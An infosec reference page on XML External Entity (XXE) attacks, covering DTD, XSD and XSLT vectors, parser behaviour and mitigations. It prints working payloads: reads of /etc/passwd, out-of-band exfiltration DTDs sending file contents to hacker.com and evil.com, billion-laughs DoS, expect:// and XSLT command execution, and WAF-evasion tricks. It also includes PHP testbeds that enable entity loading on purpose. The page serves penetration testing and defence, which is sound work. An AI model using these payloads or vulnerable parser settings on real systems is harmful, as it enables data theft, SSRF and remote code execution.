---
layout: page

title: XXE

category: infosec
see_my_category_in_header: true

permalink: /infosec/xxe.html

---

<article class="markdown-body" markdown="1">

# Content

* TOC
{:toc}

***Recommended articles***:

- Security Implications of DTD Attacks Against a Wide Range of XML Parsers. Christopher Späth. 2015 [source](https://www.nds.rub.de/media/nds/arbeiten/2015/11/04/spaeth-dtd_attacks.pdf) (contains a lot of information about various XML parsers)
- XSLT Processing Security and SSRF. Emanuel Duss, Roland Bischofberger, OWASP 2015 (contains a lot of information about XSLT vulnerabilities)
- [OWASP XXE Processing](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)
- [XXE cheat sheet (web-in-security)](http://web-in-security.blogspot.ru/2016/03/xxe-cheat-sheet.html)
- [XXE Payloads](https://gist.github.com/staaldraad/01415b990939494879b4)

<br>
***Note***: XSLT is a large separate topic, which must be investigated seprately and finalize in separate article.

<br>

---

# Overview

XXE - XML eXternal Entity attack
: XML input containing a reference to an external entity which is processed by a weakly configured XML parser, enabling disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts. [(*owasp*)](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)

DTD - Document Type Definition
: part of XML document related to <!DOCTYPE>.
    
    Its main purpose is to specify XML document structure (**this is not security-related** therefore **will be not discussed**) and to **specify XML entities**.

***XML standalone*** in `<?xml version="1.0" standalone="yes"?>` is a signal to the XML processor that the DTD is only for validation (usage of external entites will be forbidden). <br>
Default value is `no`, that is perfectly well for attacker, although some parsers ignore this option.

***XML entities types***:

- **General entities** - can be used in XML content like `&name;`

    `<!ENTITY name "Hello World">`

- **Parameter entities** - can be used inside doctype definition like `%name;` (parameter entities can insert new entities) and inside entities values like `%name;`.
    
    `<!ENTITY % name "Hello World">`

    `<!ENTITY % name "Hello %myEntity;">`

- **External entities** - entities with query to external (not declared in current XML document) resource (can be used both: general entities and parameter entities)

    `<!ENTITY name SYSTEM "URI/URL">`

    `<!ENTITY name PUBLIC "any_text" "URI/URL">`

    External entities can be used for doctypes too:

    `<!DOCTYPE name SYSTEM "address.dtd" [...]>`

    `<!DOCTYPE name PUBLIC "any text" "http://evil.com/evil.dtd">`

<div class="spoiler"><div class="spoiler-title">
    <i>XML example with entities</i>
</div><div class="spoiler-text">

{% highlight xml %}
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE content [
    <!ENTITY ent1 SYSTEM "file:///etc/passwd">
    <!ENTITY % ent2 PUBLIC "any_text" "http://evil.com/evil.dtd">
    %ent2;
    <!ENTITY % ent3 PUBLIC "any_text" '&lt;!ENTITY ent4 SYSTEM "file:///etc/passwd"&gt;'>
    %ent3;
]>
<root>&ent1;&ent4;</root>
{% endhighlight %}

</div>
</div>
<br>

XSD - XML Schema Definition Language
: XML Schema is used to define XML structure. (It is usually a separate doc.xsd)

    XSD does not depend on DTD technology, however can use it.

XSLT - eXtensible Stylesheet Language Transformations
: XSLT is used to convert one XML document to other.

    XSLT does not depend on DTD technology, however can use it.

<br>

---

# Security issues

## XXE practical usage

### XXE targets:

- web-servers (even in deep backend)
- xml-based documents: docx, pptx, odt, etc. (exist tools e.g. [oxml_xxe](https://github.com/BuffaloWill/oxml_xxe)) (microsoft office xxe)
    <br> *For Open XML formats better to target `[Content_Types].xml` file for XXE injections.*

- databases (mysql, postgresql, ...)
- XMP (Extensible Metadata Platform) in images (gif, png, jpg, ...)
- web-browsers
- etc.

### Exploitation ways

- output data in XML, returned to user
- OOB - Out-Of-Band (send sensitive data with external entity request)
- Error-based exploitation

    - invalid values/type definitions
    - schema validation

- Blind exploitation
- DoS
- RCE

### XXE specifics

XXE **can not** be used to **write files** on server, exist **only one-two exclusions** for XSLT.

Behaviour greatly varies depending on used XML parser.

XXE nature allows to target several protocols and several files at a time (because we can include several Entities simultaneously (e.g. `SYSTEM "schema://ip:port"`)).

<br>

---

## Attack vectors

### DTD attack vectors

- **confident data disclosure** (file disclosure / LFI (Local File Inclusion))
    
    External entities enables to read arbitrary files from system (if xml parser has read rights to the file)

    However, if you request directory - **usually** (everything depends on parser) this will lead to an error, but some XML parsers (e.g. JAVA Xerces) will disclosure directory fine-names

    `<!ENTITY xxe SYSTEM "file:///etc/passwd">`


- **SSRF (Server Side Request Forgery)**
    
    External entities enables to make SSRF attacks, by making request to internal network from web-server parsing XML document (meaning - making requests from internal network, bypassing perimeter protection)

    `<!ENTITY xxe SYSTEM "http://secret.dev.company.com/secret_pass.txt">`

- **Out-Of-Band** - using XML entities, data from server can be grabbed and sent to hacker.com (**NO** server output required)

    Approach 1:

    *   document.xml

        ```
        <!DOCTYPE root [
            <!ENTITY % remote SYSTEM "http://hacker.com/evil.dtd">
            %remote; %intern; %xxe;
        ]>
        ```

        `<root>&xxe;</root>` - you can change `xxe` entity to general entity

    *   http://hacker.com/evil.dtd

        ```
        <!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
        <!ENTITY % intern "<!ENTITY &#37; xxe SYSTEM 'http://hacker.com/result-is?%payl;'>">
        ```

        `<!ENTITY % intern "<!ENTITY &#37; xxe SYSTEM 'file://%payl;'>">` - consider error-based

    Approach 2:

    *   document.xml

        ```
        <!DOCTYPE root [
            <!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
            <!ENTITY % remote SYSTEM "http://hacker.com/evil.dtd">
            %remote; %intern; %xxe;
        ]>
        ```

        `<root>&xxe;</root>` - you can change `xxe` entity to general entity

    *   http://hacker.com/evil.dtd

        ```
        <!ENTITY % intern "<!ENTITY &#37; xxe SYSTEM 'http://hacker.com/result-is?%payl;'>">
        ```

        `<!ENTITY % intern "<!ENTITY &#37; xxe SYSTEM 'file://%payl;'>">` - consider error-based

    Approach 3 (*does it really work?*):

    *   CDATA inside xml

        ```
        <root>
            <![CDATA[
                <!ENTITY % stuff SYSTEM "file:///var/www/html/app/WEB-INF/ApplicationContext.xml">
            ]]>
        </root>
        ```

        ```
        <![CDATA[
            <!DOCTYPE doc [
                <!ENTITY % dtd SYSTEM "http://evil.com/">
                %dtd;
            ]>
            <xxx/> <-- ???
        ]]>
        ```

    ("Detected an entity reference loop" error must be carefully bypassed)

    Because of XML standard you have to pack external entities into evil.dtd. In core xml parameter entities must not depend on each other, parser will not make replacements.

    <br>

- **DoS - billion laughs**

    Using XML entities, server memory resource can be exhausted by constructing long entity value.

    ```
    <?xml version="1.0"?>
    <!DOCTYPE root [
        <!ENTITY hifi "hifi">
        <!ENTITY hifi1 "&hifi;&hifi;&hifi;">
        <!ENTITY hifi2 "&hifi1;&hifi1;&hifi1;">
        <!ENTITY hifi3 "&hifi2;&hifi2;&hifi2;">
    ]>
    <root>&hifi3;</root>
    ```

    Linux local devices can be used:

    ```
    <?xml version="1.0"?>
    <!DOCTYPE root [
        <!ENTITY xxe1 SYSTEM "/dev/urandom">
        <!ENTITY xxe2 SYSTEM "/dev/zero">
    ]>
    <root>&xxe1;&xxe2;</root>
    ```

    Does recursion available?

    ```
    <!DOCTYPE data [
    <!ENTITY a "a&b;" >
    <!ENTITY b "&a;" >
    ]>
    <data>&a;</data>
    ```

    <br>

- **RCE**

    Some parsers enables to execute commands from XML entities.

    e.g. for php, if 'expect' [extension](http://pecl.php.net/package/expect) is explicitly installed into php.

    `<!ENTITY xxe SYSTEM "expect://id">`

    <br>

- **error-based injections**

    Exist two types of errors:

    - errors in DTD structure
    - errors in xml schema validation

    (sources: *XML Out-Of-Band Exploitation. Alexey Osipov, Timur Yunusov. 2013*, *XML Out-Of-Band Data Retrieval. Alexey Osipov, Timur Yunusov. 2013*)

    <br>
    Context: `<!ENTITY % pay SYSTEM "file:///etc/passwd">`

    | parser        | Restrictions                  | XXE vector | parser error |
    | --- | --- | --- | --- |
    | MS System.XML | untill first %20, %0d, %0a    | `<!ENTITY % trick "<!ENTITY err SYSTEM 'file:///some'%pay; gif>"> %trick;` ||
    | Xerces        | untill first %20, %0d, %0a    | `<!ENTITY % trick "<!ENTITY :%pay;>"> %trick;` ||
    | Xerces        |                               | `<!ENTITY % trick "<!ENTITY &#37; err SYSTEM '%pay;'>"> %trick; %err;` ||
    | libxml (php)  | ~650 bytes (base64)           | `<!ENTITY % trick "<!ENTITY :%pay;>"> %trick;` ||
    | libxml (php)  | ~900 bytes                    | `<!ENTITY % trick "<!ENTITY &#37; err SYSTEM '%pay;'>"> %trick; %err;` ||
    | ??? (php)     |                               | `<!ENTITY % trick "<!ENTITY &#37; err SYSTEM 'http%pay;:/127.0.0.1/'>"> %trick; %err;` | `DOMDocument::loadXML() [ domdocument.loadxml: Invalid URI: http___ ...` |

    <br>
    ***Xerces schema validation errors examples***:

    `<!DOCTYPE html [ <!ENTITY % foo SYSTEM "file:///c:/boot.ini"> %foo; ]>`

    - parser error : Invalid URI: :[file]
    - I/O warning : failed to load external entity"[file]“
    - parser error : DOCTYPE improperly terminated
    - Warning: *** [file] in *** on line 11


    <div class="spoiler"><div class="spoiler-title" markdown="1">
    ***Possible XML schema validation constraints***:
    </div><div class="spoiler-text" markdown="1">

    | [VC: Attribute Default Value Syntactically Correct] | [VC: No Notation on Empty Element]          | [WFC: Element Type Match]            |
    | [VC: Attribute Value Type]                          | [VC: Notation Attributes]                   | [WFC: Entity Declared]               |
    | [VC: Element Valid]                                 | [VC: Notation Declared]                     | [WFC: Entity Declared]               |
    | [VC: Entity Declared]                               | [VC: One ID per Element Type]               | [WFC: External Subset]               |
    | [VC: Entity Name]                                   | [VC: One Notation Per Element Type]         | [WFC: In DTD]                        |
    | [VC: Enumeration]                                   | [VC: Proper Conditional Section/PE Nesting] | [WFC: Legal Character]               |
    | [VC: Fixed Attribute Default]                       | [VC: Proper Declaration/PE Nesting]         | [WFC: No < in Attribute Values]      |
    | [VC: ID Attribute Default]                          | [VC: Proper Group/PE Nesting]               | [WFC: No External Entity References] |
    | [VC: IDREF]                                         | [VC: Required Attribute]                    | [WFC: No Recursion]                  |
    | [VC: ID]                                            | [VC: Root Element Type]                     | [WFC: PE 3etween Declarations]       |
    | [VC: Name Token]                                    | [VC: Standalone Document Declaration]       | [WFC: PEs in Internal Subset]        |
    | [VC: No Duplicate Tokens]                           | [VC: Unique Element Type Declaration]       | [WFC: Parsed Entity]                 |
    | [VC: No Duplicate Types]                            | [VC: Unique Notation Name]                  | [WFC: Unique Att Spec]               |

    </div>
    </div>

<br>

---

### XSD attack vectors

- **Out-Of-Band** - XSD permits to make remote requests (or local files requests)

    Several ways to make request *(usually xsd is positioned in XML schema documents (doc.xsd), but some directives are placed in XML file directly)*:

    - **schemaLocation**

        <div class="spoiler"><div class="spoiler-title">
            <i>document.xml</i>
        </div><div class="spoiler-text" markdown="1">

            <document xmlns="http://any.namespace.name/like.url" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://any.namespace.name/like.url http://attacker.com/evil.xsd">text</document>

        </div>
        </div>

    - **noNamespaceSchemaLocation**

        <div class="spoiler"><div class="spoiler-title">
            <i>document.xml</i>
        </div><div class="spoiler-text" markdown="1">

            <document xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://attacker.com/evil.xsd">text</document>

        </div>
        </div>

    - **XInclude** (in xsd "http://www.w3.org/2001/XInclude" is not compatible with "http://www.w3.org/2001/XMLSchema")

        <div class="spoiler"><div class="spoiler-title">
            <i>document.xml</i>
        </div><div class="spoiler-text" markdown="1">

            <data xmlns:xi="http://www.w3.org/2001/XInclude">
                <xi:include href="http://attacker.com/evil.xml"/>
                <xi:include href="file:///etc/passwd" parse="text"/>
            </data>

        </div>
        </div>

    - **import** / **include**

        <div class="spoiler"><div class="spoiler-title">
            <i>document.xsd</i>
        </div><div class="spoiler-text" markdown="1">

            <xs:schema elementFormDefault="qualified"
                xmlns:xs="http://www.w3.org/2001/XMLSchema"
                xmlns:myNS="myNS">

                <xs:import namespace="myNS" schemaLocation="http://attacker.com/evil.xsd"/>
                <xs:include namespace="myNS2" schemaLocation="http://attacker.com/evil.xsd"/>
            </xs:schema>

        </div>
        </div>

- **error-based injections**

        <xs:restriction base="xs:string">
            <xs:pattern value="&xxe;" />
        </xs:restriction>

    In return there can be pattern validation error, if entity is not a simple string

<br>

---

### XSLT attack vectors

(sources: *XSLT Processing Security and SSRF. Emanuel Duss, Roland Bischofberger, OWASP 2015* (huge research of XSLT processors))

- getting **system information**

        <xsl:template match="/">
            XSLT Version: <xsl:value-of select="system-property('xsl:version')" />
            XSLT Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
            XSLT Vendor URL: <xsl:value-of select="system-property('xsl:version-url')" />
        </xsl:template>

- Out-Of-Band XSLT permits to make remote requests (or local files requests)

    - **xml-stylesheet**

        <div class="spoiler"><div class="spoiler-title">
            <i>document.xml (web-browser can be good testbed for this case ([example](http://www.w3schools.com/xsl/cdcatalog_with_xsl.xml)))</i>
        </div><div class="spoiler-text" markdown="1">

            <?xml version="1.0"?>
            <?xml-stylesheet type="text/xsl" href="http://evil.com/evil.xsl"?>
            <doc></doc>

        </div>
        </div>

    - **import** / **include**

        <div class="spoiler"><div class="spoiler-title">
            <i>document.xsl (similar to XSD import and include)</i>
        </div><div class="spoiler-text" markdown="1">

            <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
                <xsl:import href="http://attacker.com/evil.xsl"/>
                <xsl:include href="http://attacker.com/evil.xsl"/>
            </xsl:stylesheet>

        </div>
        </div>

    - XSLT **Out-Of-Band** through **variables** and **value-of** definition

        - only for valid xml files, or expect to get only first line

                <xsl:value-of select="document('test.html')" />
                <xsl:value-of select="document('http://dev.company.com/secret.txt')" />

        - another attack example:

                <xsl:variable name="name1" select="document('file:///etc/passwd')" />
                <xsl:variable name="name2" select="concat('http://evil.com/?', $name1)" />
                <xsl:variable name="name3" select="document($name2)" />

- **RCE**

    - <div class="spoiler"><div class="spoiler-title"><i>
        libxslt + php + registerPHPFunctions() must be called on instance of processor
        </i></div><div class="spoiler-text" markdown="1">

            <?xml version ="1.0" encoding="UTF-8"?>
            <xsl:stylesheet version="1.0"
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:php="http://php.net/xsl">
                
                <xsl:output method="html" />
                <xsl:template match="/">
                    <xsl:value-of select="php:function('shell_exec', 'sleep 10')" />
                </xsl:template>
            </xsl:stylesheet>

        </div>
        </div>

    - <div class="spoiler"><div class="spoiler-title"><i>
        Xalan-J
        </i></div><div class="spoiler-text" markdown="1">

            xmlns:runtime="http://xml.apache.org/xalan/java/java.lang.Runtime"
            xmlns:process="http://xml.apache.org/xalan/java/java.lang.Process"

            <xsl:variable name="rtobject" select="runtime:getRuntime()" />
            <xsl:variable name="process" select="runtime:exec($rtobject, 'sleep 5')" />
            <xsl:variable name="waiting" select="process:waitFor($process)" />
            <xsl:value-of select="$process" />

            <xsl:variable name="osversion" select="jv:java.lang.System.getProperty('os.name')"/>
            <xsl:value-of select="$osversion" />

        </div>
        </div>
        
        <div class="spoiler"><div class="spoiler-title"><i>
        Xalan
        </i></div><div class="spoiler-text" markdown="1">

            <xsl:stylesheet
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:jv="http://xml.apache.org/xalan/java"
                exclude-result-prefixes="jv" version="1.0">
            <xsl:template match="/">
            <root>
                <xsl:variable name="osversion" select="jv:java.lang.System.getProperty('os.name')"/>
                <xsl:value-of select="$osversion" />
            </root>
            </xsl:template>
            </xsl:stylesheet>

        </div>
        </div>

    - <div class="spoiler"><div class="spoiler-title"><i>
        Saxon EE
        </i></div><div class="spoiler-text" markdown="1">

            <?xml version="1.0"?>
            <xsl:stylesheet
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0"
                xmlns:date="java:java.util.Date" xmlns:runtime="java:java.lang.Runtime" xmlns:process="java:java.lang.Process">

                <xsl:output method="text" />
                <xsl:template match="/">
                    Date: <xsl:value-of select="date:new()" />
                    <xsl:variable name="rtobject" select="runtime:getRuntime()" />
                    <xsl:variable name="process" select="runtime:exec($rtobject, 'sleep 5')" />
                    <xsl:variable name="waiting" select="process:waitFor($process)" />
                    <xsl:value-of select="$process" />
                </xsl:template>
            </xsl:stylesheet>

        </div>
        </div>

- **database connection**

    - <div class="spoiler"><div class="spoiler-title"><i>
        Xalan-J
        </i></div><div class="spoiler-text" markdown="1">

            <xsl:param name="driver" select= "'com.mysql.jdbc.Driver'" />
            <xsl:param name="dbUrl" select="'jdbc:mysql://localhost/xslt'" />
            <xsl:param name="user" select="'xsltuser'" />
            <xsl:param name="pw" select="'xsltpw'" />
            <xsl:param name="query" select="'select test from xtable'" />

            <xsl:template match="/">
                <xsl:variable name="dbc" select="sql:new($driver, $dbUrl , $user, $pw)" />
                <xsl:variable name="table" select="sql:query($dbc, $query)" />
                <xsl:value-of select="$table/*" />
                <xsl:value-of select="sql:close($dbc)" />
            </xsl:template>

        Database driver must be included in $CLASSPATH

            java -classpath /opt/sa/xalan-j_2_7_2/xalan.jar:/opt/sa/mysql-connector-java-5.1.33/mysql-connector-java-5.1.33-bin.jar org.apache.xalan.xslt.Process -in dummy.xml -xsl database_connection.xsl

        </div></div>


- **write file** on file-system

    No output on success, error otherwise

    - <div class="spoiler"><div class="spoiler-title"><i>
        XSLT 2.0 Saxon
        </i></div><div class="spoiler-text" markdown="1">

            <xsl:template match="/">
                <xsl:result-document href="local_file.txt">
                    <xsl:text>Hello World to local file.</xsl:text>
                </xsl:result-document>
            </xsl:template>

        </div>
        </div>

    - <div class="spoiler"><div class="spoiler-title"><i>
        Xalan-J redirect:write extension
        </i></div><div class="spoiler-text" markdown="1">

            <xsl:template match="/">
                <redirect:open href="local_file.txt" />
                <redirect:write href="local_file.txt">Hello world to local file.</redirect:open>
                <redirect:close href="local_file.txt" />
            </xsl:template>

        </div>
        </div>

    - <div class="spoiler"><div class="spoiler-title"><i>
        libxslt esxl:document extension
        </i></div><div class="spoiler-text" markdown="1">

            <xsl:template match="/">
                <exsl:document href="local_file.txt">
                    <xsl:text>Hello World to local file.</xsl:text>
                </exsl:document>
            </xsl:template>

        </div>
        </div>

    - <div class="spoiler"><div class="spoiler-title"><i>
        Saxon PE / Saxon EE file:create-dir extension
        </i></div><div class="spoiler-text" markdown="1">

            <xsl:variable name="file" as="xs:string" select="'local_file.txt'" />
            <xsl:variable name="text" as="xs:string" select="'Hello World to local file.'" />
            <xsl:template match="/">
                <xsl:sequence select="file:append-text($file, $text)" />
            </xsl:template>

        Other functions: file:append-text(), file:move(), file:copy(), file:delete(), file:exists(), file:is-file(), file:is-dir(), file:read(), file:write()

        </div>
        </div>

<br>

---

## Attacks extensions

- **filters** and **wrappers** - XML parsers can provide filters to use for external entities.

    <br>
    ***PHP*** [filters](http://php.net/manual/en/wrappers.php):

    - file:// http:// https:// ftp:// data://

        `<!ENTITY xxe SYSTEM "file:///etc/passwd">`

        `<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">`

        `<!ENTITY xxe SYSTEM "data://text/plain;base64,aGVsbG8gd29ybGQ=">` *('hello world')*

    - php:// (accessing various I/O streams)

        `<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">`

    - zlib:// rar:// phar://
        
        ssh2://

        glob:// ogg://

    - expect:// (gives RCE)

        `<!ENTITY xxe SYSTEM "expect://id">`

    other parsers can support

    - gopher://, ldap:// (perl)

    <br>

- Some web-apps accepting JSON will agree to accept XML document instead. ([XXE on JSON endpoints](https://blog.netspi.com/playing-content-type-xxe-json-endpoints))

- **brute-force attribute values**

    using schema validation values for xml tags and attributes can be specified, and in case there is mismatch error will appear.

    if attacker can insert values in schema validation specification, then he can brute inserting values until error will disappear

    brute can be smart - patterns for values allows to use regular expression, though binary search is available

- ***blind attacks***

    exist equivalent for lazy evaluation (e.g. xs:choice + xs:group in xsd), though for various choices regexps can take different time for calculation

---

## Necessary requirements

### XML security mitigation

***This paragraph has to improved***

For attacker to make external entites, they must be allowed. Usually there is several options:

- allow/deny loading XML entities (e.g. flag LIBXML_NOENT for php libxml)
- allow/deny loading external entities (e.g. flag LIBXML_DTDLOAD for php libxml)
- allow/deny showing error reports (e.g. flag LIBXML_NOERROR for php libxml)
- etc. [(e.g. for php)](http://php.net/manual/ru/libxml.constants.php)

In some parsers exist constraints for using XML entities in XML tags attributes: <br>
e.g. for entites `SYSTEM 'file:///etc/passwd'` inserted into XML attributes there is an error: <br>
`Warning ... Attribute references external entity 'entity-name' in Entity`

Xerces parser XXE mitigation:

    XercesParserLiaison::DOMParserType theParser;

    theParser.setValidationScheme(xercesc::XercesDOMParser::Val_Never);
    theParser.setDoNamespaces(false);
    theParser.setDoSchema(false);
    theParser.setLoadExternalDTD(false);

<br>

---

### XSLT security mitigation

| | libxslt | Saxon HE / Saxon EE | Xalan J | Xalan C | MSXML 4.0 |
| --- | --- | --- | --- | --- | --- |
| read files | XSL_SECPREF_READ_FILE | own class implementing URIResolver interface OR <br>Whitelist allowed files | own class implementing URIResolver interface OR <br>Whitelist allowed files | xsl.setProperty ("'AllowDocumentFunction'", false); |
| read remote files, include external stylesheets | XSL_SECPREF_READ_NETWORK | own class implementing URIResolver and UnparsedTextURIResolver interfaces OR <br>Whitelist allowed files | own class implementing URIResolver interface OR <br>Whitelist allowed files | *no mitigation* | xsl.setProperty ("'AllowDocumentFunction'", false); |
| write files | XSL_SECPREF_WRITE_FILE | setFeature("http://saxon.sf.net/feature/allowexternal-functions", false); | setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true); | | |
| RCE, getProperty | | setFeature("http://saxon.sf.net/feature/allowexternal-functions", false); | setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true); | | xsl.setProperty ("'AllowXsltScript'", false); |
| XXE | | setFeature("http://xml.org/sax/features/external-general-entities", false);<br>setFeature("http://xml.org/sax/features/external-parameter-entities", false); | setFeature("http://xml.org/sax/features/external-general-entitles", false); | own EntityResolver, which returns empty source | xsl.setProperty ("'ProhibitDTD'", false); |

<br>

---

## WAF bypass

- `SYSTEM` and `PUBLIC` are practically synonyms
- change encoding for example on UTF-16, UTF-7, etc.
    
    `<?xml version="1.0" encoding="UTF-16"?>`

- tampering with names (*[XXE payloads](https://gist.github.com/staaldraad/01415b990939494879b4)*):
    
    `<!DOCTYPE :. SYTEM "http://"`
    `<!DOCTYPE :_-_: SYTEM "http://"`
    `<!DOCTYPE {0xdfbf} SYSTEM "http://"`

<br>

---

<div class="spoiler"><div class="spoiler-title" markdown="1">
# XML parsers properties
</div><div class="spoiler-text" markdown="1">

#### XML parsers

Book, showing main information about XML, XML parsing, XML attacks and ***a lot of various XML parsers characteristics***:

- *Security Implications of DTD Attacks Against a Wide Range of XML Parsers. Christopher Späth. 2015 [source](https://www.nds.rub.de/media/nds/arbeiten/2015/11/04/spaeth-dtd_attacks.pdf)*

Various parsers (*italics - vulnerable parsers*):

- Java: *Xerces*, *Crimson*, *Piccolo*
- PHP: SimpleXML, XMLReader, DOMDocument (LibXML)
- Perl: *Twig*, *LibXml*
- .NET: XmlReader, *XmlDocument*
- Python: Etree, *xml.sax*, *pulldom*, *lxml*
- Ruby: REXML, Nokogiri
- MS System.XML

<br>

| *Xerces*                                                                      | *Libxml* | *JAXP* |
| latest version - secure defaults | latest version - vulnerable defaults | latest version - secure defaults |
| --- | --- | --- |
| **Validate schemas features**                                                 | [predefined constants](http://php.net/manual/en/libxml.constants.php) ||
| http://xml.org/sax/features/validation --> true                               | expand_entities(0); ||
| http://xml.org/sax/features/namespace-prefixes --> true                       |||
| http://xml.org/sax/features/namespaces --> true                               |||
| http://apache.org/xml/features/validation/schema --> true                     |||
| http://apache.org/xml/features/validation/schema-full-checking --> true       |||
| **Avoid external entities attacks**                                           |||
| http://xml.org/sax/features/external-general-entities --> false               |||
| http://xml.org/sax/features/external-parameter-entities --> false             |||
| http://apache.org/xml/features/disallow-doctype-decl --> true                 |||
| **Avoid resolving of external XML schema locations**                          |||
| p.setEntityResolver(new MyResolver());                                        |||
| **Utilize Security Manager to limit number of nodes and entity expansions**   |||
| p.setProperty("http://apache.org/xml/properties/securitymanager",<br>"org.apache.xerces.util.SecurityManager");   |||
| **Check XML against local server-side schemas and DTDs**                                                          |||

*Setting feature in Xerces*:

```
SAXParser p = new SAXParser();
p.setFeature("...", true/false);
```

***MS System.XML***:

- [-] can't read XML files without encoding declaration
- [-] no wrappers

***Xerces***:

- [+] allows to read directories (by revealing located in directory file names).
- [+] sends NTLM auth data 
- [+] has various wrappers

***LibXML*** 

- [+] has various wrappers
- [-] can't read big files (>8 Kb) by default

#### XSLT processors

Popular XSLT processors: libxslt, Saxon, Xalan, MSXML, MS System.XML

</div>
</div>

<br>

---

# Testbeds

<div class="spoiler"><div class="spoiler-title">
    <i>PHP testbed for loading XML file</i>
</div><div class="spoiler-text" markdown="1">

    {% highlight php %}
<?php
error_reporting(E_ALL);
ini_set("display_errors", 1);

libxml_disable_entity_loader (false);
$xmlcontent = file_get_contents('php://input');

$dom = new DOMDocument();
$dom->loadXML($xmlcontent, LIBXML_NOENT | LIBXML_DTDLOAD);
$dom->xinclude();

echo $dom->saveXML();
?>
    {% endhighlight %}

*php.ini: allow_url_fopen - ???*

</div>
</div>
<br>

<div class="spoiler"><div class="spoiler-title">
    <i>PHP testbed for loading XSD file</i>
</div><div class="spoiler-text" markdown="1">

    {% highlight php %}
<?php
error_reporting(E_ALL);
ini_set("display_errors", 1);

libxml_disable_entity_loader (false);
$xsdcontent = file_get_contents('php://input');

$xmldom = new DOMDocument();
$xmldom->loadXML('<root>data</root>', LIBXML_NOENT | LIBXML_DTDLOAD);
$ret = $xmldom->schemaValidateSource($xsdcontent);
echo $ret;
?>
    {% endhighlight %}

*php.ini: allow_url_fopen - ???*

</div>
</div>
<br>

<div class="spoiler"><div class="spoiler-title">
    <i>PHP testbed for loading XSLT file</i>
</div><div class="spoiler-text" markdown="1">

    {% highlight php %}
<?php
error_reporting(E_ALL);
ini_set("display_errors", 1);

libxml_disable_entity_loader (false);
$content = file_get_contents('php://input');

$domxsl = new DOMDocument();
$domxsl->loadXML($content, LIBXML_NOENT | LIBXML_DTDLOAD);
$xslt = new xsltProcessor();
$xslt->importStyleSheet($domxsl);
$dom = new DOMDocument();
$dom->loadXML("<root>data</root>", LIBXML_NOENT | LIBXML_DTDLOAD);
echo $xslt->transformToXML($dom);
?>
    {% endhighlight %}

*php.ini: allow_url_fopen - ???*

</div>
</div>
<br>

<div class="spoiler"><div class="spoiler-title">
    <i>Java (SAX parser) testbed for loading XML file</i>
</div><div class="spoiler-text" markdown="1">

    {% highlight java %}
private static Document buildDOM (String sXML)
throws ParserConfigurationException, SAXException, IOException
{
    DocumentBuilder builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
    return builder.parse(new InputSource(new StringReader(sXML)));
}
    {% endhighlight %}

</div>
</div>
<br>

<div class="spoiler"><div class="spoiler-title">
    <i>.NET (MSXML parser) testbed for loading XML file</i>
</div><div class="spoiler-text" markdown="1">

    {% highlight csharp %}
private void processUserRequest(string requestAsXML)
{
    XmlDocument d = new XMLDocument();
    d.Load(requestAsXML);
    string value = d.SelectSingleNode("description").InnerText;
}
    {% endhighlight %}

</div>
</div>

<br>

---

# References

- *XML External Entity Attacks (XXE). Sascha Herzog. OWASP. 2010*
- [*XXE cheat sheet (web-in-security)*](http://web-in-security.blogspot.ru/2016/03/xxe-cheat-sheet.html)
- *XML Schema, DTD, and Entity Attacks. Timothy D. Morgan, Omar Al Ibrahim. 2014*
- *XSLT Processing Security and SSRF. Emanuel Duss, Roland Bischofberger, OWASP 2015*
- etc. (a lot of minor web-sites, articles and presentations)

</article>
